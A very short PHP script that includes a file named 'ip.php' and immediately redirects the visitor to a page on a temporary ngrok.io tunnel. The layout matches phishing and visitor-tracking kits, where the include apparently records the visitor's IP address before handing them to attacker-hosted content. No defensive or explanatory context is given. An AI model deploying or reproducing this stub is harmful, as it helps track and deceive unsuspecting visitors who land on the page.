<?php
include 'ip.php';
header('Location: https://2cf0-2405-201-c031-d806-d829-4200-88ff-983d.ngrok.io/index2.html');
exit
?>
